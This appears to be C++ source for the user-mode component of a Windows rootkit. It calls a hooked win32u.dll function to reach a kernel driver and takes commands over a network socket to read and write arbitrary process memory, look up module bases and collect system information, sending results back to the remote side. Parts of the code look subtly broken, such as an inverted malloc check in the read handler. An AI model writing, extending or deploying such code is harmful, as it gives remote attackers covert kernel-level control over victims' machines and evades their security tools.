#include "rootreqs.h"


// Call the hooking function -
template<typename ... Arg>
uint64_t CallHook(const Arg ... args) {
	printf("Loading user32.dll ..\n");
	LoadLibraryA("user32.dll");

	printf("Creating a pointer to the NtQueryCompositionSurfaceStatistics function..\n");
	void* HookToFunc = GetProcAddress(LoadLibraryA("win32u.dll"), "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function
	if (HookToFunc == NULL) {
		printf("Could not get a pointer to NtQueryCompositionSurfaceStatistics from win32u.dll, stopping the calling..\n");
		return NULL;
	}

	printf("Creating a function variable to use it for calling NtQueryCompositionSurfaceStatistics..\n");
	auto Function = static_cast<uint64_t(_stdcall*)(Arg...)>(HookToFunc);  // export the function so i can call it

	printf("Calling the function variable with the supplier argument/s..\n");
	uint64_t FuncRet = Function(args ...);

	printf("Function had worked and return value/s were received, wait for processing..\n");
	return FuncRet;
}


std::uint32_t GetPID(std::string_view PrcName) {  // get PID for function process
	PROCESSENTRY32 PrcEntry;
	const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
	if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
		return NULL; // invalid handle
	}
	PrcEntry.dwSize = sizeof(PROCESSENTRY32);  // set size of function process entry (after validating the given handle)
	while (Process32Next(snapshot_handle.get(), &PrcEntry) == TRUE) {
		std::wstring wideExeFile(PrcEntry.szExeFile);
		std::string narrowExeFile(wideExeFile.begin(), wideExeFile.end());

		if (PrcName.compare(narrowExeFile) == NULL) {
			return PrcEntry.th32ProcessID;  // return the PID of the required process from the process snapshot
		}
	}
	return NULL;  // if something did not work correctly
}


BOOL CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack) {
	CallHook(RootkInst);
	if (PassBack) {
		PASS_DATA result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
		if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
			return FALSE;
		}
	}
	return TRUE;
}


BOOL WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst) {
	PASS_DATA result;
	std::uint32_t SrcPID = NULL;
	std::uint32_t DstPID = NULL;
	PVOID LocalWrite = NULL;
	const char* MagicMdl = "mymyymym";

	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}

	// if writing is from a user-supplied buffer receive the buffer -
	if (strcmp(RootkInst->MdlName, "regular") == 0) {
		LocalWrite = malloc(RootkInst->Size);
		if (!LocalWrite) {
			printf("Cannot allocate buffer for writing locally\n");
			return FALSE;
		}

		result = root_internet::RecvData(tosock, RootkInst->Size, LocalWrite, FALSE, 0);
		if (result.err || result.value != RootkInst->Size) {
			printf("Cannot get write value\n");
			free(LocalWrite);
			return FALSE;
		}
		RootkInst->Buffer = LocalWrite;
	}


	// Source module / kernel mode address -
	if ((ULONG64)RootkInst->Buffer < 0x7FFFFFFFFFFFFFFF) {
		if (strcmp(RootkInst->MdlName, "regular") != 0) {
			if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
				SrcPID = GetCurrentProcessId();
			}
			else {
				SrcPID = GetPID(RootkInst->MdlName);
			}

			if (SrcPID == NULL) {
				return FALSE;
			}
		}
		else {
			SrcPID = NULL;
		}
	}

	else {
		SrcPID = NULL;
	}


	// Destination module / kernel mode address -
	if ((ULONG64)RootkInst->Out < 0x7FFFFFFFFFFFFFFF) {
		if (strcmp(RootkInst->DstMdlName, MagicMdl) == 0) {
			DstPID = GetCurrentProcessId();
		}

		else {
			DstPID = GetPID(RootkInst->DstMdlName);
		}

		if (DstPID == NULL) {
			return FALSE;
		}
	}

	else {
		DstPID = NULL;
	}


	RootkInst->MainPID = DstPID;
	RootkInst->SemiPID = SrcPID;
	RootkInst->Buffer = LocalWrite;
	return CallKernelDriver(tosock, RootkInst, TRUE);
}


BOOL ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst) {
	PASS_DATA result;
	std::uint32_t PrcID;
	const char* MagicMdl = "mymyymym";

	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), &RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}

	LocalRead = malloc(RootkInst->Size);
	if (LocalRead != NULL) {
		return FALSE;
	}

	if ((ULONG)RootkInst->Buffer < 0x7FFFFFFFFFFFFFFF) {
		if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
			PrcID = GetCurrentProcessId();
		}
		else {
			PrcID = GetPID(RootkInst->MdlName);
		}

		if (PrcID == NULL) {
			return FALSE;
		}
	}

	else {
		PrcID = GetCurrentProcessId();;
	}

	RootkInst->Out = LocalRead;
	RootkInst->MainPID = PrcID;
	BOOL KrnlRes = CallKernelDriver(tosock, RootkInst, FALSE);

	if (!KrnlRes) {
		return FALSE;
	}

	result = root_internet::SendData(tosock, LocalRead, (int)RootkInst->Size, FALSE, 0);
	if (result.err || result.value != (int)RootkInst->Size) {
		return FALSE;
	}

	result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}
	return TRUE;
}


BOOL MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst) {
	PASS_DATA result;
	const char* MagicMdl = "mymyymym";
	ULONG PID;

	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}

	if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
		PID = GetCurrentProcessId();
	}
	else {
		PID = GetPID(RootkInst->MdlName);
	}

	if (PID != NULL) {
		RootkInst->MainPID = PID;
		return CallKernelDriver(tosock, RootkInst, TRUE);
	}

	else {
		return FALSE;
	}
}


BOOL DbgStrKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst) {
	PASS_DATA result;

	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}
	else {
		RootkInst->MainPID = GetCurrentProcessId();
		return CallKernelDriver(tosock, RootkInst, TRUE);
	}
}


BOOL SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID InitSysBuf) {
	PASS_DATA result;
	PVOID SysDataBuffer = NULL;
	ULONG64 TotalSize = 0;
	RKSYSTEM_INFORMATION_CLASS CurrInf;

	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return FALSE;
	}

	RootkInst->Operation = RKOP_GETSIZESYS;
	RootkInst->Buffer = InitSysBuf;
	RootkInst->MainPID = GetCurrentProcessId();
	BOOL KrnlRes = CallKernelDriver(tosock, RootkInst, FALSE);

	if (!KrnlRes) {
		return FALSE;
	}

	for (ULONG64 i = 0; i < sizeof(RKSYSTEM_INFORMATION_CLASS) * strlen(RootkInst->MdlName); i += sizeof(RKSYSTEM_INFORMATION_CLASS)) {
		memcpy(&CurrInf, (PVOID)((ULONG64)InitSysBuf + i), sizeof(RKSYSTEM_INFORMATION_CLASS));
		TotalSize += CurrInf.InfoSize;
	}

	SysDataBuffer = malloc(TotalSize);
	if (SysDataBuffer == NULL) {
		return FALSE;
	}

	RootkInst->Operation = RKOP_SYSINFO;
	RootkInst->Out = SysDataBuffer;
	KrnlRes = CallKernelDriver(tosock, RootkInst, TRUE);
	if (!KrnlRes) {
		return FALSE;
	}

	result = root_internet::SendData(tosock, &TotalSize, sizeof(TotalSize), FALSE, 0);
	if (result.err || result.value != sizeof(TotalSize)) {
		free(SysDataBuffer);
		return FALSE;
	}

	result = root_internet::SendData(tosock, SysDataBuffer, (int)TotalSize, FALSE, 0);
	free(SysDataBuffer);
	if (result.err || result.value != (int)TotalSize) {
		return FALSE;
	}
	return TRUE;
}